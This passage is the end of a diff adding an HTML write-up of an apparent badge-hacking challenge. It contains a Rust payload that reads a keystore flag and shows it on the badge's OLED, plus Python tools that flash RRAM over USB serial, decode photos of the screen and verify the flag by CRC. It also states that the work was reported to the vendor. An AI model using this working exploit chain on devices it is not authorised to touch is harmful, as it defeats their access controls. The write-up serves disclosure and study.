+            satp = in(reg) SATP,
+            e    = in(reg) u_phase as usize,
+            out(&quot;t0&quot;) _,
+        );
+    }
+    loop { core::hint::spin_loop() }
+}
+
+#[unsafe(no_mangle)]
+pub extern &quot;C&quot; fn render() -&gt; ! {
+    unsafe { core::arch::asm!(&quot;csrw satp, zero&quot;, &quot;sfence.vma&quot;); }
+    let iox  = bao1x_hal::iox::Iox::new(utralib::utra::iox::HW_IOX_BASE as *mut u32);
+    let udma = bao1x_hal::udma::GlobalConfig::new();
+    let mut oled = open_oled(&amp;iox, &amp;udma);
+
+    let (f, u, fault) = unsafe {
+        (*core::ptr::addr_of!(RES_F),
+         *core::ptr::addr_of!(RES_U),
+         core::ptr::read_volatile(core::ptr::addr_of!(FAULTED)))
+    };
+    let c = crc32(&amp;f);
+    // Page 1: CRC32 of the flag, its first 3 bytes, and the fault latch.
+    // CRC 190a55ad means all zeros, i.e. the read was denied.
+    let p1 = [(c &gt;&gt; 24) as u8, (c &gt;&gt; 16) as u8, (c &gt;&gt; 8) as u8, c as u8,
+              f[0], f[1], f[2], fault as u8];
+    loop {
+        draw_page8(oled.buffer_mut(), &amp;p1, 1);        oled.redraw().ok(); spin(400_000_000);
+        draw_page8(oled.buffer_mut(), &amp;u[0..8], 2);   oled.redraw().ok(); spin(400_000_000);
+        for p in 0..4usize {
+            draw_page8(oled.buffer_mut(), &amp;f[p*8..p*8+8], p + 3);
+            oled.redraw().ok(); spin(400_000_000);
+        }
+    }
+}
+
+/// Eight bytes as an 8x8 grid: 12 px cells on a 14 px pitch, inset 8 px, MSB left.
+/// Plus a 2 px lit border (registration) and `tag` blobs in the top margin (page id).
+/// NOTE the polarity: clear() fills 0xFFFF_FFFF, so a 0 bit is LIT.
+fn draw_page8(fb: &amp;mut [u32], eight: &amp;[u8], tag: usize) {
+    for w in fb.iter_mut() { *w = 0xFFFF_FFFF; }
+    let lit = |x: usize, y: usize| {
+        if x &lt; 128 &amp;&amp; y &lt; 128 {
+            let b = x + y * 128;
+            fb[b / 32] &amp;= !(1u32 &lt;&lt; (b % 32));
+        }
+    };
+    for i in 0..128usize { for t in 0..2usize {
+        lit(i, t); lit(i, 127 - t); lit(t, i); lit(127 - t, i);
+    }}
+    for k in 0..tag.min(8) { for dy in 3..7usize { for dx in 0..6usize {
+        lit(20 + k * 11 + dx, dy);
+    }}}
+    for (row, &amp;byte) in eight.iter().enumerate() {
+        for bit in 0..8usize {
+            if (byte &gt;&gt; (7 - bit)) &amp; 1 == 0 { continue; }
+            for dy in 0..12usize { for dx in 0..12usize {
+                lit(8 + bit * 14 + dx, 8 + row * 14 + dy);
+            }}
+        }
+    }
+}
+
+fn spin(n: u32) { for _ in 0..n { core::hint::spin_loop() } }
+
+fn crc32(d: &amp;[u8]) -&gt; u32 {
+    let mut c: u32 = 0xFFFF_FFFF;
+    for &amp;b in d {
+        c ^= b as u32;
+        for _ in 0..8 { let m = (c &amp; 1).wrapping_neg(); c = (c &gt;&gt; 1) ^ (0xEDB8_8320 &amp; m); }
+    }
+    !c
+}
+
+fn open_oled&lt;&#x27;a&gt;(iox: &amp;&#x27;a bao1x_hal::iox::Iox, udma: &amp;&#x27;a bao1x_hal::udma::GlobalConfig)
+    -&gt; bao1x_hal::sh1107::Oled128x128&lt;&#x27;a&gt;
+{
+    use bao1x_hal::sh1107::{MainThreadToken, Oled128x128};
+    use utralib::*;
+    let sysctrl = CSR::new(utra::sysctrl::HW_SYSCTRL_BASE as *mut u32);
+    let fd = sysctrl.r(utra::sysctrl::SFR_CGUFDPER) &amp; 0xFF;
+    let perclk = bao1x_hal::clocks::divide_by_fd(fd, CLKTOP_HZ) / 2;
+    let mut o = Oled128x128::new(MainThreadToken::new(), perclk, iox, udma);
+    o.init().ok();
+    o
+}
+</code></pre></details>
+
+<details class="src"><summary>elf2bin.py<span class="fnote">flatten ELF, refuse to brick</span></summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;elf2bin.py -- flatten the payload ELF, and refuse to produce one that bricks.
+
+  python elf2bin.py target/riscv32imac-unknown-none-elf/release/dc34-payload payload.bin
+
+There is no objcopy in this toolchain install, and there does not need to be:
+the loadable segments are all we want. The two asserts are the point of the file.
+&quot;&quot;&quot;
+import struct, sys
+
+KERNEL_START = 0x60099000    # offsets/common.rs:13 -- xous.img begins here
+ENTRY        = 0x60090000
+
+src, dst = sys.argv[1], sys.argv[2]
+d = open(src, &#x27;rb&#x27;).read()
+assert d[:4] == b&#x27;\x7fELF&#x27; and d[4] == 1, &quot;not a 32-bit ELF&quot;
+entry, phoff = struct.unpack_from(&#x27;&lt;II&#x27;, d, 24)
+phentsize, phnum = struct.unpack_from(&#x27;&lt;HH&#x27;, d, 42)
+
+segs = []
+for i in range(phnum):
+    o = phoff + i * phentsize
+    typ, off, vaddr, paddr, filesz, memsz, flags, align = struct.unpack_from(&#x27;&lt;8I&#x27;, d, o)
+    if typ == 1 and filesz &gt; 0:          # PT_LOAD with real bytes.
+        segs.append((vaddr, off, filesz))   # a filesz of 0 is .bss: it lives in RAM,
+                                            # and including it would inflate the image
+                                            # by the whole RAM origin offset.
+base = min(s[0] for s in segs)
+top  = max(s[0] + s[2] for s in segs)
+out = bytearray(top - base)
+for vaddr, off, filesz in segs:
+    out[vaddr - base:vaddr - base + filesz] = d[off:off + filesz]
+
+print(f&quot;entry=0x{entry:08x} base=0x{base:08x} end=0x{top:08x} size={len(out)}&quot;)
+assert entry == ENTRY and base == ENTRY, &quot;payload must start exactly at 0x60090000&quot;
+assert top &lt; KERNEL_START, (
+    f&quot;payload ends at 0x{top:08x}, at or past KERNEL_START 0x{KERNEL_START:08x}. &quot;
+    &quot;Writing this would overwrite xous.img and brick the badge.&quot;)
+open(dst, &#x27;wb&#x27;).write(out)
+print(f&quot;OK: {KERNEL_START - top} bytes of headroom below KERNEL_START&quot;)
+</code></pre></details>
+
+<details class="src"><summary>uf2send.py<span class="fnote">write RRAM over USB serial</span></summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;uf2send.py -- write RRAM through boot1&#x27;s update-mode `uf2` command.
+
+  uf2send.py word &lt;addr-hex&gt; &lt;value-hex&gt;     one 32-bit little-endian word
+  uf2send.py file &lt;addr-hex&gt; &lt;path&gt;          a binary blob, chunked
+  uf2send.py --dry ...                       print records, send nothing
+
+The guards below are not paranoia. boot1 itself lives at 0x60000000-0x6005FFFF,
+and update mode is inside boot1. Corrupt that and there is no way back in:
+it is the single unrecoverable action in this whole exercise.
+&quot;&quot;&quot;
+import base64, glob, struct, sys, time
+import serial
+
+FAMILY   = 0xA7D76373
+RRAM     = 0x60000000
+MIN_ADDR = 0x60060000          # LOADER_START. Never write below this.
+MAX_ADDR = RRAM + 0x3DA000     # HW_RERAM_MEM + RRAM_STORAGE_LEN
+KERNEL   = 0x60099000          # KERNEL_START: xous.img. Never reach this.
+CHUNK    = 256                 # bytes per record (max 476)
+
+def uf2(addr, payload, blkno, nblk):
+    b = struct.pack(&#x27;&lt;8I&#x27;, 0x0A324655, 0x9E5D5157, 0x00002000, addr,
+                    len(payload), blkno, nblk, FAMILY)
+    b += payload + b&#x27;\x00&#x27; * (476 - len(payload))
+    return b + struct.pack(&#x27;&lt;I&#x27;, 0x0AB16F30)
+
+def check(addr, n):
+    if addr % 4:
+        sys.exit(f&quot;REFUSING: {addr:#x} is not 4-byte aligned&quot;)
+    if addr &lt; MIN_ADDR:
+        sys.exit(f&quot;REFUSING: {addr:#x} is below LOADER_START. That is boot0/boot1, &quot;
+                 &quot;and corrupting it is unrecoverable: update mode lives there.&quot;)
+    if addr &lt; KERNEL &lt;= addr + n:
+        sys.exit(f&quot;REFUSING: {addr:#x}+{n} crosses KERNEL_START {KERNEL:#x}. &quot;
+                 &quot;That would overwrite xous.img and brick the badge.&quot;)
+    if addr + n &gt; MAX_ADDR:
+        sys.exit(f&quot;REFUSING: {addr:#x}+{n} exceeds RRAM storage {MAX_ADDR:#x}&quot;)
+
+args = [a for a in sys.argv[1:] if a != &quot;--dry&quot;]
+DRY  = &quot;--dry&quot; in sys.argv
+if len(args) != 3:
+    sys.exit(__doc__)
+mode, addr_s, val = args
+addr = int(addr_s, 16)
+if mode == &quot;word&quot;:
+    data = struct.pack(&#x27;&lt;I&#x27;, int(val, 16))
+elif mode == &quot;file&quot;:
+    data = open(val, &#x27;rb&#x27;).read()
+    if len(data) % 4:
+        data += b&#x27;\x00&#x27; * (4 - len(data) % 4)
+else:
+    sys.exit(__doc__)
+
+check(addr, len(data))
+nblk = (len(data) + CHUNK - 1) // CHUNK
+recs = [uf2(addr + i*CHUNK, data[i*CHUNK:(i+1)*CHUNK], i, nblk) for i in range(nblk)]
+print(f&quot;[plan] {len(data)} bytes -&gt; {nblk} record(s), {addr:#x}..{addr+len(data):#x}&quot;)
+if DRY:
+    for r in recs:
+        print(&quot;uf2 &quot; + base64.b64encode(r).decode())
+    sys.exit(0)
+
+ports = sorted(glob.glob(&quot;/dev/cu.usbmodem*&quot;))
+if not ports:
+    sys.exit(&quot;no serial port found&quot;)
+s = serial.Serial(ports[0], 115200, timeout=3)
+s.write(b&quot;\r\n&quot;); time.sleep(0.3); s.reset_input_buffer()
+
+acked = 0
+for i, r in enumerate(recs):
+    s.write(b&quot;uf2 &quot; + base64.b64encode(r) + b&quot;\r\n&quot;)
+    deadline = time.time() + 3
+    while time.time() &lt; deadline:            # scan for the ack; log lines share this stream
+        line = s.readline().decode(errors=&quot;replace&quot;)
+        if &quot;OK&quot; in line or &quot;ok&quot; in line:
+            acked += 1
+            break
+    print(f&quot;\r  {i+1}/{nblk} acked={acked}&quot;, end=&quot;&quot;, flush=True)
+print(f&quot;\n[done] {acked}/{nblk} records acknowledged&quot;)
+if acked != nblk:
+    sys.exit(&quot;NOT every record was acknowledged. Do not power cycle. Retry the write.&quot;)
+</code></pre></details>
+
+<details class="src"><summary>decode.py<span class="fnote">photo to bytes</span></summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;decode.py -- turn a phone photo of one payload page into 8 bytes.
+
+  python decode.py page1.jpg [page2.jpg ...]
+
+The payload draws a 2 px lit border around the whole panel. That border is the
+only reason hand-held photos work: it pins the origin and the scale, so cell
+bloom can no longer walk the sampling grid off by a row.
+
+Sampling geometry must match draw_page8() exactly:
+  cells 8 x 8, pitch 14 px, 12 px lit core, inset 8 px, MSB leftmost.
+&quot;&quot;&quot;
+import sys, itertools
+from PIL import Image, ImageFilter
+
+CONTROL_PAGE2 = &quot;<your UUID control>&quot;   # UUID slot, this unit. Liveness check only.
+
+
+def find_frame(im):
+    &quot;&quot;&quot;Bounding box of the lit border, tried over several crops and thresholds.&quot;&quot;&quot;
+    w, h = im.size
+    for (a, b, c, d) in [(0.12, 0.08, 0.94, 0.94), (0.05, 0.05, 0.98, 0.98)]:
+        X0, Y0, X1, Y1 = int(w*a), int(h*b), int(w*c), int(h*d)
+        sub = im.crop((X0, Y0, X1, Y1)); sw, sh = sub.size; px = sub.load()
+        for thr in (210, 190, 170, 150, 130, 110, 90):
+            rows = [sum(1 for x in range(0, sw, 2) if px[x, y] &gt; thr) for y in range(sh)]
+            cols = [sum(1 for y in range(0, sh, 2) if px[x, y] &gt; thr) for x in range(sw)]
+            if max(rows) == 0 or max(cols) == 0:
+                continue
+            def edges(p):
+                m = max(p); hot = [i for i, v in enumerate(p) if v &gt; 0.55 * m]
+                return hot[0], hot[-1]
+            ry0, ry1 = edges(rows); cx0, cx1 = edges(cols)
+            wp, hp = cx1 - cx0, ry1 - ry0
+            # the panel is square, so reject anything wildly off-aspect
+            if wp &gt; 150 and hp &gt; 150 and 0.72 &lt; wp / hp &lt; 1.40:
+                return [X0 + cx0, X0 + cx1, Y0 + ry0, Y0 + ry1]
+    return None
+
+
+def sample(im, frame, off):
+    &quot;&quot;&quot;Rectify to 128x128 (x3 supersample) and read the 64 cells.&quot;&quot;&quot;
+    x0, x1, y0, y1 = frame
+    a, b, c, d = off
+    up = 3; N = 128 * up
+    quad = (x0+a, y0+b,  x0+a, y1+d,  x1+c, y1+d,  x1+c, y0+b)
+    # rotate(270): the badge is photographed on its side
+    disp = im.transform((N, N), Image.QUAD, quad, Image.BICUBIC).rotate(270)
+    p = disp.load()
+
+    def box(X, Y, r):
+        t = n = 0
+        for dy in range(-r, r+1):
+            for dx in range(-r, r+1):
+                t += p[min(N-1, max(0, X+dx)), min(N-1, max(0, Y+dy))]; n += 1
+        return t / n
+
+    vals = [box((8 + col*14 + 6)*up, (8 + row*14 + 6)*up, 4*up)
+            for row in range(8) for col in range(8)]
+    lo, hi = min(vals), max(vals)
+    thr = (lo + hi) / 2
+    # margin: how close the least-confident cell sits to the threshold.
+    # Maximising it is how we pick the right grid alignment.
+    margin = min(abs(v - thr) for v in vals) / max(1e-9, hi - lo)
+    bits = [1 if v &gt; thr else 0 for v in vals]
+    out = bytes(sum(bits[i*8 + j] &lt;&lt; (7 - j) for j in range(8)) for i in range(8))
+    return out, margin
+
+
+def decode(path):
+    im = Image.open(path).convert(&quot;L&quot;).filter(ImageFilter.MedianFilter(3))
+    frame = find_frame(im)
+    if frame is None:
+        return None, 0.0
+    cw = (frame[1] - frame[0]) * 14 / 128.0     # one cell, in photo pixels
+    ch = (frame[3] - frame[2]) * 14 / 128.0
+    # Search sub-cell offsets. Getting this wrong by one whole cell silently
+    # inserts a byte, which looks like plausible data. Ask how large your
+    # search step is in CELLS, never in pixels.
+    best = None
+    for k in itertools.product([-0.5, -0.25, 0, 0.25, 0.5], repeat=4):
+        off = (k[0]*cw, k[1]*ch, k[2]*cw, k[3]*ch)
+        out, margin = sample(im, frame, off)
+        if best is None or margin &gt; best[1]:
+            best = (out, margin)
+    return best
+
+
+for path in sys.argv[1:]:
+    out, margin = decode(path)
+    if out is None:
+        print(f&quot;{path}: frame not found, reshoot with the whole panel in view&quot;)
+        continue
+    tag = &quot;&quot;
+    if out.hex() == CONTROL_PAGE2:
+        tag = &quot;  &lt;- page 2 control EXACT&quot;
+    print(f&quot;{path}  margin={margin:.2f}  {out.hex()}{tag}&quot;)
+</code></pre></details>
+
+<details class="src"><summary>assemble.py<span class="fnote">stitch pages, verify CRC</span></summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;assemble.py -- stitch four decoded pages into the 32-byte flag and check it.
+
+  python assemble.py &lt;page4hex&gt; &lt;page5hex&gt; &lt;page6hex&gt; &lt;page7hex&gt; &lt;crc32hex&gt;
+
+The badge computed that CRC over the bytes it actually read, before they ever
+became pixels. If it matches, the photo pipeline is proven end to end. If it
+does not, reshoot; do not hand-patch a nibble because it &quot;looks close&quot;.
+&quot;&quot;&quot;
+import sys, zlib
+
+pages, expect = sys.argv[1:5], int(sys.argv[5], 16)
+flag = b&quot;&quot;.join(bytes.fromhex(p) for p in pages)
+got = zlib.crc32(flag) &amp; 0xFFFFFFFF
+
+print(&quot;flag  =&quot;, flag.hex())
+print(f&quot;crc32 = 0x{got:08x}   on-chip = 0x{expect:08x}&quot;)
+print(&quot;VERIFIED&quot; if got == expect else &quot;MISMATCH: reshoot the pages&quot;)
+
+if flag == bytes(32):
+    print(&quot;all zeros: the keystore denied the read. You were in S-mode, not U-mode.&quot;)
+</code></pre></details>
+
+
+<h2>Part 8 &middot; What this does and does not do to your badge</h2>
+
+<ul>
+  <li>Everything is read-only except two writes: the 4-byte jump redirect, and your program in
+      free space. Both get reverted in step 09.</li>
+  <li>No writes to the access-control memory, the one-way counters, or the external flash chip.</li>
+  <li>The badge stays <strong>Sealed</strong> the whole time. Ours reported Paranoid 0/0 and
+      Possible attacks 0 after roughly a dozen deploy-and-restore cycles, with the light gene and
+      all counters intact.</li>
+  <li>Developer mode is never involved, so the secret-erasing policy never triggers.</li>
+</ul>
+
+<p>The second document in this pair covers <strong>Ko</strong>, the shared secret that the whole
+badge-to-badge light exchange is built on. It picks up exactly where this one stops, because
+everything it does depends on first getting here.</p>
+
+<footer>
+  Device: Baosec-lite, board type <code>Oem</code>, stepping A0 &middot; UUID
+  <code><your badge UUID></code> &middot; Xous <code>v0.10.1-43-g8964027ff</code> &middot;
+  boot1 <code>v0.10.1-0-gbcfdca404</code>. Reported to <code>dc34@baochip.com</code>.
+</footer>
+
+</div>
+<script>
+  // eight bytes in the payload's own output format, which draws a skull
+  // every byte in this project arrived, as an 8x8 grid of lit squares.
+  (function () {
+    var bytes = [0x3C,0x7E,0xDB,0xFF,0xE7,0x7E,0x5A,0x3C];
+    var g = document.getElementById('g'), html = '';
+    for (var r = 0; r < 8; r++)
+      for (var b = 0; b < 8; b++)
+        html += '<i class="' + ((bytes[r] >> (7 - b)) & 1 ? 'on' : '') + '"></i>';
+    g.innerHTML = html;
+  })();
+</script>
